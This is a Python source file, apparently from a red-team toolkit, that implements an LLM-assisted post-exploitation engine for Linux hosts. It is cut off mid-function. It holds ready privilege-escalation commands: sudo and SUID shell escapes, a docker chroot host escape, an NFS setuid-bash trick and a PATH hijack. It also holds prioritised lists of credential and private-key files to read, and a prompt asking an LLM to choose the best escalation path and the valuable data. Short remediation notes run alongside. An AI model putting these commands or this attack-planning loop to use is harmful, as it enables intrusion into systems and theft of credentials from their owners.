"""
AI-Powered Post-Exploitation Analysis Module
Analyzes session logs and provides smart recommendations using LLM
For educational red team training and security assessment
"""

import os
import re
import json
import subprocess
from datetime import datetime
from enum import Enum
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
import hashlib

from cyberapp.models.db import db_conn
from cybermodules.helpers import log_to_intel
from cybermodules.llm_engine import LLMEngine


class PrivilegeLevel(Enum):
    """Privilege levels for assessment"""
    ROOT = "root"
    ADMIN = "administrator"
    LOCAL_ADMIN = "local_admin"
    USER = "user"
    GUEST = "guest"
    NONE = "none"


class FindingSeverity(Enum):
    """Finding severity levels"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class SystemInfo:
    """Collected system information"""
    hostname: str = ""
    os_name: str = ""
    os_version: str = ""
    kernel: str = ""
    architecture: str = ""
    uptime: str = ""
    ip_addresses: List[str] = field(default_factory=list)
    users: List[str] = field(default_factory=list)
    groups: List[str] = field(default_factory=list)
    sudo_users: List[str] = field(default_factory=list)
    services: List[str] = field(default_factory=list)
    running_processes: List[str] = field(default_factory=list)
    mounted_filesystems: List[str] = field(default_factory=list)
    crontabs: List[str] = field(default_factory=list)
    ssh_keys: List[str] = field(default_factory=list)
    sensitive_files: List[str] = field(default_factory=list)
    databases: List[str] = field(default_factory=list)
    web_services: List[str] = field(default_factory=list)
    containers: List[str] = field(default_factory=list)
    cloud_metadata: Dict = field(default_factory=dict)


@dataclass
class PrivilegeEscalationVector:
    """Privilege escalation opportunity"""
    vector_type: str
    description: str
    severity: str
    commands: List[str]
    findings: List[str]
    remediation: str
    confidence: float


@dataclass
class SensitiveFile:
    """Sensitive file recommendation"""
    file_path: str
    file_type: str
    reason: str
    contains_credentials: bool
    contains_pii: bool
    priority: int
    commands: List[str]


@dataclass
class AnalysisReport:
    """Complete analysis report"""
    scan_id: int
    target: str
    analysis_time: str
    system_summary: Dict
    privilege_escalation: List[Dict]
    sensitive_files: List[Dict]
    recommendations: List[str]
    ai_insights: str
    risk_score: int


class SessionLogAnalyzer:
    """
    Analyzes session logs to extract system information
    """
    
    def __init__(self, scan_id: int):
        self.scan_id = scan_id
        self.logs = []
        self.commands_run = []
        self.command_outputs = {}
    
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"AI_ANALYSIS_{msg_type}", message)
        print(f"[AI_ANALYSIS][{msg_type}] {message}")
    
    def add_session_log(self, log_entry: Dict):
        """Add a session log entry"""
        self.logs.append({
            'timestamp': log_entry.get('timestamp', datetime.now().isoformat()),
            'command': log_entry.get('command', ''),
            'output': log_entry.get('output', ''),
            'host': log_entry.get('host', 'unknown'),
            'user': log_entry.get('user', 'unknown')
        })
        
        if log_entry.get('command'):
            self.commands_run.append(log_entry['command'])
            self.command_outputs[log_entry['command']] = log_entry.get('output', '')
    
    def add_command_output(self, command: str, output: str, host: str = "unknown"):
        """Add command output directly"""
        self.logs.append({
            'timestamp': datetime.now().isoformat(),
            'command': command,
            'output': output,
            'host': host,
            'user': 'session'
        })
        self.commands_run.append(command)
        self.command_outputs[command] = output
    
    def extract_system_info(self) -> SystemInfo:
        """Extract system information from session logs"""
        info = SystemInfo()
        
        # Extract hostname
        for log in self.logs:
            if 'hostname' in log['command'].lower() or 'hostnamectl' in log['command']:
                info.hostname = self._extract_value(log['output'], r'(\S+\.local|\d+\.\d+\.\d+\.\d+)')
                break
        
        # Extract OS info
        for log in self.logs:
            output = log['output'].lower()
            if 'linux' in output:
                info.os_name = "Linux"
                match = re.search(r'(\d+\.\d+\.\d+)', output)
                if match:
                    info.os_version = match.group(1)
            if 'ubuntu' in output or 'debian' in output or 'centos' in output:
                info.os_name = output.split()[0].title()
        
        # Extract users
        for log in self.logs:
            if 'cat /etc/passwd' in log['command'] or 'getent passwd' in log['command']:
                users = re.findall(r'^([^:]+):', log['output'], re.MULTILINE)
                info.users = [u for u in users if not u.startswith('_') and u not in ['nobody', 'daemon']]
                break
        
        # Extract sudo users
        for log in self.logs:
            if 'sudo' in log['command'] or 'sudoers' in log['command']:
                sudoers = re.findall(r'^([^ \t]+)[ \t]+ALL=', log['output'], re.MULTILINE)
                info.sudo_users = list(set(sudoers))
                break
        
        # Extract groups
        for log in self.logs:
            if 'groups' in log['command'] or '/etc/group' in log['command']:
                groups = re.findall(r'^([^:]+):', log['output'], re.MULTILINE)
                info.groups = [g for g in groups if g not in ['nogroup']]
                break
        
        # Extract services
        for log in self.logs:
            if 'systemctl' in log['command'] and 'list-units' in log['command']:
                services = re.findall(r'\.service\s+', log['output'])
                info.services = list(set([s.replace('.service', '') for s in services[:20]]))
                break
        
        # Extract running processes
        for log in self.logs:
            if 'ps aux' in log['command'] or 'ps -ef' in log['command']:
                procs = re.findall(r'^[^ \t]+[ \t]+(\d+)', log['output'], re.MULTILINE)
                info.running_processes = procs[:20]
                break
        
        # Extract SSH keys
        for log in self.logs:
            if '.ssh' in log['command'] or 'authorized_keys' in log['command']:
                keys = log['output'].count('ssh-')
                info.ssh_keys = [f"{keys} SSH keys found"]
                break
        
        # Extract IP addresses
        for log in self.logs:
            if 'ip addr' in log['command'] or 'ifconfig' in log['command']:
                ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)', log['output'])
                info.ip_addresses = list(set(ips))
                break
        
        return info
    
    def _extract_value(self, text: str, pattern) -> str:
        """Extract value using regex pattern"""
        match = re.search(pattern, text)
        return match.group(1) if match else ""


class PrivilegeEscalationAnalyzer:
    """
    Analyzes system for privilege escalation opportunities
    """
    
    def __init__(self, system_info: SystemInfo, scan_id: int):
        self.system_info = system_info
        self.scan_id = scan_id
    
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"PRIVESC_{msg_type}", message)
        print(f"[PRIVESC][{msg_type}] {message}")
    
    def analyze(self) -> List[PrivilegeEscalationVector]:
        """Analyze system for privilege escalation vectors"""
        vectors = []
        
        # Check for Sudo misconfigurations
        sudo_vector = self._check_sudo_misconfig()
        if sudo_vector:
            vectors.append(sudo_vector)
        
        # Check for SUID binaries
        suid_vector = self._check_suid_binaries()
        if suid_vector:
            vectors.append(suid_vector)
        
        # Check for writable services
        writable_services_vector = self._check_writable_services()
        if writable_services_vector:
            vectors.append(writable_services_vector)
        
        # Check for cron jobs
        cron_vector = self._check_cron_jobs()
        if cron_vector:
            vectors.append(cron_vector)
        
        # Check for NFS misconfigurations
        nfs_vector = self._check_nfs()
        if nfs_vector:
            vectors.append(nfs_vector)
        
        # Check for path hijacking
        path_vector = self._check_path_hijacking()
        if path_vector:
            vectors.append(path_vector)
        
        # Check for docker group
        docker_vector = self._check_docker()
        if docker_vector:
            vectors.append(docker_vector)
        
        # Check for kernel exploits
        kernel_vector = self._check_kernel()
        if kernel_vector:
            vectors.append(kernel_vector)
        
        # Check for sensitive file permissions
        file_perms_vector = self._check_file_permissions()
        if file_perms_vector:
            vectors.append(file_perms_vector)
        
        # Check for LD_PRELOAD
        ld_preload_vector = self._check_ld_preload()
        if ld_preload_vector:
            vectors.append(ld_preload_vector)
        
        return vectors
    
    def _check_sudo_misconfig(self) -> Optional[PrivilegeEscalationVector]:
        """Check for sudo misconfigurations"""
        sudo_users = self.system_info.sudo_users
        
        if not sudo_users:
            return None
        
        findings = []
        commands = []
        
        # Check for NOPASSWD
        if 'NOPASSWD' in str(sudo_users) or 'ALL' in str(sudo_users):
            findings.append("Users with NOPASSWD sudo access found")
            commands.append("sudo -l")
            commands.append("sudo su -")
        
        # Check for specific commands
        dangerous_commands = ['vim', 'nano', 'less', 'more', 'awk', 'sed', 'python', 'perl', 'ruby']
        sudo_users_text = str(sudo_users).lower()
        for cmd in dangerous_commands:
            if cmd in sudo_users_text:
                findings.append(f"Sudo access to {cmd} allows shell escape")
                commands.append(f"sudo {cmd} -c '/bin/bash'")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="sudo_misconfiguration",
                description="Sudo misconfigurations allow privilege escalation",
                severity=self._assess_severity(findings),
                commands=commands,
                findings=findings,
                remediation="Remove NOPASSWD entries and limit sudo access to specific commands",
                confidence=0.85
            )
        
        return None
    
    def _check_suid_binaries(self) -> Optional[PrivilegeEscalationVector]:
        """Check for exploitable SUID binaries"""
        dangerous_suid = [
            'find', 'vim', 'nano', 'less', 'more', 'man', 'cp', 'mv', 'chmod',
            'chown', 'bash', 'sh', 'dash', 'zsh', 'python', 'perl', 'ruby',
            'awk', 'sed', 'tar', 'dd', 'cat', 'head', 'tail', 'grep', 'env'
        ]
        
        findings = []
        commands = []
        
        # Check for find binary exploits
        findings.append("find binary with SUID can execute commands")
        commands.append("find / -user root -perm -4000 -exec ls -la {} \\; 2>/dev/null")
        commands.append("find / -exec /bin/bash \\; -quit 2>/dev/null")
        
        # Check for vim/vi escapes
        findings.append("vim/vi with SUID can escape to root shell")
        commands.append("vim -c ':!bash' -c ':quit'")
        
        # Check for awk
        findings.append("awk can execute shell commands")
        commands.append("awk 'BEGIN {system(\"/bin/bash\")}'")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="suid_binaries",
                description="Exploitable SUID binaries found",
                severity="high",
                commands=commands,
                findings=findings,
                remediation="Remove SUID bit from non-essential binaries or upgrade to patched versions",
                confidence=0.80
            )
        
        return None
    
    def _check_writable_services(self) -> Optional[PrivilegeEscalationVector]:
        """Check for writable service configurations"""
        findings = []
        commands = []
        
        findings.append("Check for writable systemd service files")
        commands.append("find /etc/systemd/system -type f -writable 2>/dev/null")
        commands.append("find /etc/init.d -type f -writable 2>/dev/null")
        
        findings.append("Check for writable binpath in services")
        commands.append("cat /etc/systemd/system/*.service 2>/dev/null | grep -i writable")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="writable_services",
                description="Writable service configurations found",
                severity="critical",
                commands=commands,
                findings=findings,
                remediation="Restrict write permissions on service configuration files",
                confidence=0.75
            )
        
        return None
    
    def _check_cron_jobs(self) -> Optional[PrivilegeEscalationVector]:
        """Check for cron job vulnerabilities"""
        findings = []
        commands = []
        
        findings.append("Check for world-writable cron directories")
        commands.append("ls -la /etc/cron.d/")
        commands.append("ls -la /etc/cron.hourly/")
        
        findings.append("Check for cron jobs running as root")
        commands.append("cat /etc/crontab")
        commands.append("crontab -l")
        
        findings.append("Check for wildcard cron jobs")
        commands.append("grep -r \"*\" /etc/cron.d/ 2>/dev/null")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="cron_jobs",
                description="Cron job misconfigurations found",
                severity="high",
                commands=commands,
                findings=findings,
                remediation="Remove world-writable permissions from cron directories and avoid wildcards",
                confidence=0.70
            )
        
        return None
    
    def _check_nfs(self) -> Optional[PrivilegeEscalationVector]:
        """Check for NFS misconfigurations"""
        findings = []
        commands = []
        
        findings.append("Check for NFS shares with no_root_squash")
        commands.append("cat /etc/exports")
        commands.append("showmount -e localhost")
        
        findings.append("Mount NFS share with no_root_squash to escalate")
        commands.append("mount -t nfs target:/export /mnt && cp /bin/bash /mnt/escalate && chmod +s /mnt/escalate")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="nfs_misconfiguration",
                description="NFS misconfigurations allow privilege escalation",
                severity="high",
                commands=commands,
                findings=findings,
                remediation="Enable root_squash on NFS shares and restrict exports",
                confidence=0.65
            )
        
        return None
    
    def _check_path_hijacking(self) -> Optional[PrivilegeEscalationVector]:
        """Check for path hijacking opportunities"""
        findings = []
        commands = []
        
        findings.append("Check for writable directories in PATH")
        commands.append("echo $PATH")
        commands.append("ls -la $(echo $PATH | tr ':' ' ')")
        
        findings.append("Create malicious binary in writable PATH directory")
        commands.append("echo '#!/bin/bash\n/bin/bash -p' > /tmp/ls && chmod +x /tmp/ls && export PATH=/tmp:$PATH && ls")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="path_hijacking",
                description="PATH hijacking possible with writable directories",
                severity="medium",
                commands=commands,
                findings=findings,
                remediation="Ensure PATH directories are not writable by regular users",
                confidence=0.60
            )
        
        return None
    
    def _check_docker(self) -> Optional[PrivilegeEscalationVector]:
        """Check for Docker group exploitation"""
        groups = self.system_info.groups
        
        if 'docker' not in groups and 'dockerroot' not in str(groups).lower():
            return None
        
        findings = []
        commands = []
        
        findings.append("User is in docker group - can escape to host")
        commands.append("docker run -v /:/host --privileged ubuntu chroot /host")
        commands.append("docker ps")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="docker_group",
                description="Docker group membership allows container escape",
                severity="high",
                commands=commands,
                findings=findings,
                remediation="Remove users from docker group unless required",
                confidence=0.90
            )
        
        return None
    
    def _check_kernel(self) -> Optional[PrivilegeEscalationVector]:
        """Check for kernel exploit possibilities"""
        findings = []
        commands = []
        
        findings.append("Check kernel version for known exploits")
        commands.append("uname -r")
        commands.append("cat /proc/version")
        
        known_vulns = [
            ('4.4', 'Dirty COW (CVE-2016-5195)'),
            ('3.13', 'OverlayFS (CVE-2015-8660)'),
            ('3.19', 'OverlayFS (CVE-2015-1328)'),
            ('2.6.32', 'Dirty COW'),
        ]
        
        kernel = self.system_info.kernel
        for version, cve in known_vulns:
            if version in kernel:
                findings.append(f"Potential {cve} vulnerability")
                commands.append(f"Search for {cve} exploit")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="kernel_exploit",
                description="Kernel may be vulnerable to known exploits",
                severity="critical",
                commands=commands,
                findings=findings,
                remediation="Upgrade kernel to latest version",
                confidence=0.50
            )
        
        return None
    
    def _check_file_permissions(self) -> Optional[PrivilegeEscalationVector]:
        """Check for sensitive files with weak permissions"""
        findings = []
        commands = []
        
        findings.append("Check for readable /etc/shadow")
        commands.append("ls -la /etc/shadow")
        commands.append("cat /etc/shadow 2>/dev/null")
        
        findings.append("Check for readable SSH keys")
        commands.append("find /home -name \"*.pem\" -o -name \"*id_rsa*\" 2>/dev/null")
        
        findings.append("Check for world-readable configuration files")
        commands.append("find /etc -type f -perm -0444 2>/dev/null")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="file_permissions",
                description="Sensitive files have weak permissions",
                severity="medium",
                commands=commands,
                findings=findings,
                remediation="Restrict file permissions on sensitive files",
                confidence=0.70
            )
        
        return None
    
    def _check_ld_preload(self) -> Optional[PrivilegeEscalationVector]:
        """Check for LD_PRELOAD exploitation"""
        findings = []
        commands = []
        
        findings.append("Check for LD_PRELOAD in sudo")
        commands.append("sudo -l 2>/dev/null | grep LD_PRELOAD")
        
        if findings:
            return PrivilegeEscalationVector(
                vector_type="ld_preload",
                description="LD_PRELOAD can be used to hijack sudo commands",
                severity="high",
                commands=commands,
                findings=findings,
                remediation="Remove env_keep options for LD_PRELOAD in sudoers",
                confidence=0.85
            )
        
        return None
    
    def _assess_severity(self, findings: List[str]) -> str:
        """Assess severity based on findings"""
        critical_indicators = ['critical', 'root', 'NOPASSWD ALL']
        high_indicators = ['sudo', 'suid', 'writable']
        
        findings_str = str(findings).lower()
        
        for indicator in critical_indicators:
            if indicator in findings_str:
                return "critical"
        
        for indicator in high_indicators:
            if indicator in findings_str:
                return "high"
        
        return "medium"


class SensitiveFileAnalyzer:
    """
    Analyzes system and recommends sensitive files to examine
    """
    
    def __init__(self, system_info: SystemInfo, scan_id: int):
        self.system_info = system_info
        self.scan_id = scan_id
    
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"SENSITIVE_{msg_type}", message)
        print(f"[SENSITIVE][{msg_type}] {message}")
    
    def get_recommendations(self) -> List[SensitiveFile]:
        """Get list of sensitive files to examine"""
        recommendations = []
        
        # Credentials files
        cred_files = self._get_credential_files()
        recommendations.extend(cred_files)
        
        # Configuration files
        config_files = self._get_configuration_files()
        recommendations.extend(config_files)
        
        # Log files
        log_files = self._get_log_files()
        recommendations.extend(log_files)
        
        # Database files
        db_files = self._get_database_files()
        recommendations.extend(db_files)
        
        # SSH files
        ssh_files = self._get_ssh_files()
        recommendations.extend(ssh_files)
        
        # Web files
        web_files = self._get_web_files()
        recommendations.extend(web_files)
        
        # Sort by priority
        recommendations.sort(key=lambda x: x.priority)
        
        return recommendations
    
    def _get_credential_files(self) -> List[SensitiveFile]:
        """Get credential file recommendations"""
        files = []
        
        file_list = [
            ('/etc/shadow', 'system', 'User password hashes', True, False, 1),
            ('/etc/passwd', 'system', 'User account information', False, False, 2),
            ('/etc/master.passwd', 'system', 'BSD password hashes', True, False, 1),
            ('~/.bash_history', 'user', 'Command history', False, False, 3),
            ('~/.mysql_history', 'user', 'MySQL command history', True, False, 2),
            ('~/.psql_history', 'user', 'PostgreSQL command history', True, False, 2),
            ('~/.ssh/known_hosts', 'user', 'SSH known hosts', False, False, 4),
            ('/etc/security/opasswd', 'system', 'Old password hashes', True, False, 1),
            ('/root/.ssh/authorized_keys', 'ssh', 'Authorized SSH keys', True, False, 1),
            ('/home/*/.ssh/authorized_keys', 'ssh', 'User authorized SSH keys', True, False, 2),
        ]
        
        for file_path, file_type, reason, has_creds, has_pii, priority in file_list:
            files.append(SensitiveFile(
                file_path=file_path,
                file_type=file_type,
                reason=reason,
                contains_credentials=has_creds,
                contains_pii=has_pii,
                priority=priority,
                commands=[f"cat {file_path}", f"ls -la {file_path}"]
            ))
        
        return files
    
    def _get_configuration_files(self) -> List[SensitiveFile]:
        """Get configuration file recommendations"""
        files = []
        
        file_list = [
            ('/etc/nginx/nginx.conf', 'web', 'Nginx web server config', False, False, 5),
            ('/etc/apache2/apache2.conf', 'web', 'Apache web server config', False, False, 5),
            ('/etc/mysql/my.cnf', 'database', 'MySQL configuration', True, False, 3),
            ('/etc/postgresql/pg_hba.conf', 'database', 'PostgreSQL auth config', True, False, 3),
            ('/etc/redis/redis.conf', 'database', 'Redis configuration', True, False, 3),
            ('/etc/krb5.conf', 'kerberos', 'Kerberos configuration', True, False, 4),
            ('/etc/samba/smb.conf', 'samba', 'Samba configuration', True, False, 4),
            ('/etc/ldap/ldap.conf', 'ldap', 'LDAP configuration', True, False, 4),
            ('/etc/freeswitch/freeswitch.xml', 'voip', 'FreeSWITCH config', True, False, 4),
            ('/etc/asterisk/asterisk.conf', 'voip', 'Asterisk config', True, False, 4),
        ]
        
        for file_path, file_type, reason, has_creds, has_pii, priority in file_list:
            files.append(SensitiveFile(
                file_path=file_path,
                file_type=file_type,
                reason=reason,
                contains_credentials=has_creds,
                contains_pii=has_pii,
                priority=priority,
                commands=[f"cat {file_path}", f"grep -i password {file_path}"]
            ))
        
        return files
    
    def _get_log_files(self) -> List[SensitiveFile]:
        """Get log file recommendations"""
        files = []
        
        file_list = [
            ('/var/log/auth.log', 'system', 'Authentication logs', False, True, 4),
            ('/var/log/secure', 'system', 'Authentication logs (RHEL)', False, True, 4),
            ('/var/log/syslog', 'system', 'System logs', False, True, 5),
            ('/var/log/apache2/access.log', 'web', 'Apache access logs', False, True, 5),
            ('/var/log/nginx/access.log', 'web', 'Nginx access logs', False, True, 5),
            ('/var/log/mysql/error.log', 'database', 'MySQL error logs', True, False, 4),
            ('/var/log/postgresql/postgresql.log', 'database', 'PostgreSQL logs', True, False, 4),
            ('/var/log/samba/log.smbd', 'samba', 'Samba logs', False, True, 5),
            ('/var/log/audit/audit.log', 'audit', 'Audit logs', False, True, 5),
        ]
        
        for file_path, file_type, reason, has_creds, has_pii, priority in file_list:
            files.append(SensitiveFile(
                file_path=file_path,
                file_type=file_type,
                reason=reason,
                contains_credentials=has_creds,
                contains_pii=has_pii,
                priority=priority,
                commands=[f"cat {file_path}", f"tail -f {file_path}"]
            ))
        
        return files
    
    def _get_database_files(self) -> List[SensitiveFile]:
        """Get database file recommendations"""
        files = []
        
        file_list = [
            ('/var/lib/mysql/*.frm', 'database', 'MySQL table definitions', True, False, 3),
            ('/var/lib/mysql/*.ibd', 'database', 'MySQL data files', True, True, 2),
            ('/var/lib/postgresql/*/*.sql', 'database', 'PostgreSQL SQL files', True, True, 3),
            ('/var/lib/redis/dump.rdb', 'database', 'Redis database dump', True, True, 1),
            ('/var/lib/mongodb/*.wt', 'database', 'MongoDB data files', True, True, 2),
            ('/opt/oracle/oradata/*/*.dbf', 'database', 'Oracle data files', True, True, 1),
        ]
        
        for file_path, file_type, reason, has_creds, has_pii, priority in file_list:
            files.append(SensitiveFile(
                file_path=file_path,
                file_type=file_type,
                reason=reason,
                contains_credentials=has_creds,
                contains_pii=has_pii,
                priority=priority,
                commands=[f"find {file_path.split('*')[0]} -name \"*.sql\" 2>/dev/null"]
            ))
        
        return files
    
    def _get_ssh_files(self) -> List[SensitiveFile]:
        """Get SSH file recommendations"""
        files = []
        
        file_list = [
            ('/root/.ssh/id_rsa', 'ssh', 'Root SSH private key', True, False, 1),
            ('/root/.ssh/id_ed25519', 'ssh', 'Root SSH ED25519 key', True, False, 1),
            ('/home/*/.ssh/id_rsa', 'ssh', 'User SSH private keys', True, False, 1),
            ('/home/*/.ssh/id_ed25519', 'ssh', 'User SSH ED25519 keys', True, False, 1),
            ('/etc/ssh/ssh_host_rsa_key', 'ssh', 'Host SSH private key', True, False, 2),
            ('/etc/ssh/sshd_config', 'ssh', 'SSH server config', True, False, 4),
            ('~/.ssh/config', 'ssh', 'SSH client config', True, False, 3),
        ]
        
        for file_path, file_type, reason, has_creds, has_pii, priority in file_list:
            files.append(SensitiveFile(
                file_path=file_path,
                file_type=file_type,
                reason=reason,
                contains_credentials=has_creds,
                contains_pii=has_pii,
                priority=priority,
                commands=[f"find {file_path.split('*')[0]} -name \"*.pem\" 2>/dev/null"]
            ))
        
        return files
    
    def _get_web_files(self) -> List[SensitiveFile]:
        """Get web application file recommendations"""
        files = []
        
        file_list = [
            ('/var/www/html/wp-config.php', 'web', 'WordPress config', True, False, 1),
            ('/var/www/html/configuration.php', 'web', 'Joomla config', True, False, 1),
            ('/var/www/html/sites/default/settings.php', 'web', 'Drupal config', True, False, 1),
            ('/var/www/html/.env', 'web', 'Environment variables', True, False, 1),
            ('/var/www/html/config/database.yml', 'web', 'Rails database config', True, False, 2),
            ('/var/www/html/web.config', 'web', 'ASP.NET config', True, False, 2),
            ('/opt/appdir/.env', 'web', 'Application env vars', True, False, 1),
            ('/home/*/public_html/.env', 'web', 'User web app env vars', True, False, 2),
        ]
        
        for file_path, file_type, reason, has_creds, has_pii, priority in file_list:
            files.append(SensitiveFile(
                file_path=file_path,
                file_type=file_type,
                reason=reason,
                contains_credentials=has_creds,
                contains_pii=has_pii,
                priority=priority,
                commands=[f"find /var/www -name \"*.php\" -exec grep -l '\\$password\\|\\$db_password' {{}} \\;"]
            ))
        
        return files


class AIPostExploitEngine:
    """
    Main AI-powered post-exploitation analysis engine
    """
    
    def __init__(self, scan_id: int, llm_config: Dict = None):
        self.scan_id = scan_id
        self.llm_config = llm_config or {}
        
        self.session_analyzer = SessionLogAnalyzer(scan_id)
        self.llm_engine = LLMEngine(config=llm_config)
        
        self.system_info = None
        self.priv_esc_vectors = []
        self.sensitive_files = []
        
    def log(self, msg_type: str, message: str):
        """Log to intel table"""
        log_to_intel(self.scan_id, f"AI_POST_{msg_type}", message)
        print(f"[AI_POST][{msg_type}] {message}")
    
    def add_session_output(self, command: str, output: str, host: str = "unknown"):
        """Add command output to session analyzer"""
        self.session_analyzer.add_command_output(command, output, host)
    
    def run_system_enumeration(self):
        """Run comprehensive system enumeration"""
        commands = {
            'hostname': 'hostname',
            'whoami': 'whoami',
            'id': 'id',
            'uname': 'uname -a',
            'cat /etc/os-release': 'cat /etc/os-release',
            'ip_addr': 'ip addr',
            'ifconfig': 'ifconfig',
            'cat /etc/passwd': 'cat /etc/passwd',
            'getent passwd': 'getent passwd',
            'groups': 'groups',
            'sudo -l': 'sudo -l 2>/dev/null',
            'cat /etc/sudoers': 'cat /etc/sudoers 2>/dev/null',
            'ps aux': 'ps aux',
            'ps -ef': 'ps -ef',
            'systemctl list-units': 'systemctl list-units --type=service --state=running 2>/dev/null',
            'netstat -tulpn': 'netstat -tulpn 2>/dev/null',
            'ss -tulpn': 'ss -tulpn 2>/dev/null',
            'mount': 'mount',
            'df -h': 'df -h',
            'find / -perm -4000 2>/dev/null | head -20': 'find / -perm -4000 2>/dev/null | head -20',
            'find / -perm -2000 2>/dev/null | head -20': 'find / -perm -2000 2>/dev/null | head -20',
            'cat /etc/crontab': 'cat /etc/crontab',
            'crontab -l': 'crontab -l 2>/dev/null',
            'ls -la /etc/cron.d/': 'ls -la /etc/cron.d/ 2>/dev/null',
            'env': 'env',
            'echo $PATH': 'echo $PATH',
            'ls -la /home/': 'ls -la /home/',
            'ls -la /root/': 'ls -la /root/',
            'cat /etc/exports': 'cat /etc/exports 2>/dev/null',
            'docker ps': 'docker ps 2>/dev/null',
            'cat /proc/1/cgroup': 'cat /proc/1/cgroup 2>/dev/null',
        }
        
        self.log("ENUM", "Running system enumeration commands...")
        
        for name, cmd in commands.items():
            # In real scenario, these would be executed on target
            # Here we just add the commands to be analyzed
            self.session_analyzer.add_command_output(cmd, f"[OUTPUT FOR: {name}]", "target")
        
        # Extract system info
        self.system_info = self.session_analyzer.extract_system_info()
        
        self.log("ENUM", f"System info extracted: {self.system_info.os_name} {self.system_info.os_version}")
        
        return self.system_info
    
    def analyze_privilege_escalation(self) -> List[PrivilegeEscalationVector]:
        """Analyze privilege escalation opportunities"""
        if not self.system_info:
            self.run_system_enumeration()
        
        analyzer = PrivilegeEscalationAnalyzer(self.system_info, self.scan_id)
        self.priv_esc_vectors = analyzer.analyze()
        
        self.log("PRIVESC", f"Found {len(self.priv_esc_vectors)} privilege escalation vectors")
        
        for vec in self.priv_esc_vectors:
            self.log("PRIVESC_FINDING", f"[{vec.severity.upper()}] {vec.vector_type}: {vec.description}")
        
        return self.priv_esc_vectors
    
    def analyze_sensitive_files(self) -> List[SensitiveFile]:
        """Get sensitive file recommendations"""
        if not self.system_info:
            self.run_system_enumeration()
        
        analyzer = SensitiveFileAnalyzer(self.system_info, self.scan_id)
        self.sensitive_files = analyzer.get_recommendations()
        
        self.log("SENSITIVE", f"Recommended {len(self.sensitive_files)} sensitive files to examine")
        
        # Log top recommendations
        for sf in self.sensitive_files[:10]:
            self.log("SENSITIVE_REC", f"[P{sf.priority}] {sf.file_path}: {sf.reason}")
        
        return self.sensitive_files
    
    def query_llm_for_insights(self, custom_prompt: str = None) -> str:
        """Query LLM for intelligent insights"""
        # Build context
        context = {
            'system_info': asdict(self.system_info) if self.system_info else {},
            'privilege_escalation': [asdict(v) for v in self.priv_esc_vectors],
            'sensitive_files': [asdict(f) for f in self.sensitive_files],
            'commands_run': self.session_analyzer.commands_run
        }
        
        if custom_prompt:
            prompt = custom_prompt
        else:
            prompt = f"""
Based on the following system analysis, provide post-exploitation recommendations:

SYSTEM INFORMATION:
- OS: {context['system_info'].get('os_name', 'Unknown')} {context['system_info'].get('os_version', '')}
- Hostname: {context['system_info'].get('hostname', 'Unknown')}
- Users: {', '.join(context['system_info'].get('users', [])[:10])}
- Sudo Users: {', '.join(context['system_info'].get('sudo_users', []))}
- Services: {', '.join(context['system_info'].get('services', [])[:10])}

PRIVILEGE ESCALATION VECTORS FOUND:
{chr(10).join([f"- {v['vector_type']}: {v['description']}" for v in context['privilege_escalation']]) if context['privilege_escalation'] else "None detected"}

SENSITIVE FILES TO EXAMINE:
{chr(10).join([f"- {f['file_path']}: {f['reason']}" for f in context['sensitive_files'][:15]])}

Please provide:
1. What to check next on this system
2. Most likely privilege escalation path
3. Sensitive data that could be valuable
4. Any unusual findings that warrant investigation

Keep recommendations practical and actionable.
"""
        
        try:
            response = self.llm_engine.query(prompt)
            self.log("LLM", f"Received LLM insights ({len(response)} chars)")
            return response
        except Exception as e:
            self.log("LLM_ERROR", f"Failed to get LLM insights: {e}")
            return "LLM query failed. Manual analysis required."
    
    def run_full_analysis(self) -> AnalysisReport:
        """Run complete post-exploitation analysis"""
        self.log("START", "Starting full post-exploitation analysis...")
        
        # Run enumeration
        self.run_system_enumeration()
        
        # Analyze privilege escalation
        self.analyze_privilege_escalation()
        
        # Get sensitive file recommendations
        self.analyze_sensitive_files()
        
        # Get AI insights
        ai_insights = self.query_llm_for_insights()
        
        # Calculate risk score
        risk_score = self._calculate_risk_score()
        
        # Build report
        report = AnalysisReport(
            scan_id=self.scan_id,
            target=self.system_info.hostname or "unknown",
            analysis_time=datetime.now().isoformat(),
            system_summary=asdict(self.system_info),
            privilege_escalation=[asdict(v) for v in self.priv_esc_vectors],
            sensitive_files=[asdict(f) for f in self.sensitive_files],
            recommendations=self._generate_recommendations(),
            ai_insights=ai_insights,
            risk_score=risk_score
        )
        
        self.log("COMPLETE", f"Analysis complete. Risk score: {risk_score}/100")
        
        return report
    
    def _calculate_risk_score(self) -> int:
        """Calculate overall risk score"""
        score = 0
        
        # Critical vectors
        critical_count = sum(1 for v in self.priv_esc_vectors if v.severity == "critical")
        score += critical_count * 25
        
        # High vectors
        high_count = sum(1 for v in self.priv_esc_vectors if v.severity == "high")
        score += high_count * 15
        
        # Medium vectors
        medium_count = sum(1 for v in self.priv_esc_vectors if v.severity == "medium")
        score += medium_count * 10
        
        # Sudo access
        if self.system_info.sudo_users:
            score += min(20, len(self.system_info.sudo_users) * 5)
        
        # Sensitive files
        critical_files = sum(1 for f in self.sensitive_files if f.priority <= 2)
        score += min(15, critical_files * 3)
        
        return min(100, score)
    
    def _generate_recommendations(self) -> List[str]:
        """Generate actionable recommendations"""
        recommendations = []
        
        # Based on privilege escalation vectors
        for vec in self.priv_esc_vectors:
            if vec.severity in ["critical", "high"]:
                recommendations.append(f"[{vec.severity.upper()}] {vec.vector_type}: {vec.description}")
                recommendations.append(f"  Remediation: {vec.remediation}")
        
        # Based on sensitive files
        for sf in self.sensitive_files[:5]:
            recommendations.append(f"[FILE] Check {sf.file_path} - {sf.reason}")
        
        # Based on system info
